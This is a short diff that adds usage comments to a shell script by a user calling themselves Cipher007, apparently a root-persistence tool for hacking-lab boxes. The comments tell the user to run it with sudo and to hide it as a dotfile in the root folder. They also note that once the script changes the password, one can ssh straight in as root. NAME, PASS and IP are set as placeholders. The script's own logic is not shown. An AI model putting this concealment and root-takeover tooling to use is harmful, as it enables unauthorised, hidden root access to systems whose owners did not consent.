@@ -2,6 +2,13 @@
 # github: https://github.com/Cipher7
 # discord: Cipher007#1099
 
+# Usage : 
+#        chmod +x <filename>
+#        sudo bash <filename>
+
+#tip: use a dot before your file name to just hide your file and store the file in the root folder
+#after the scipt changes the password, you can directly ssh into the box as root
+
 NAME=Cipher007  #change this
 PASS=seriously!   #change this
 IP=10.10.10.10    #change this
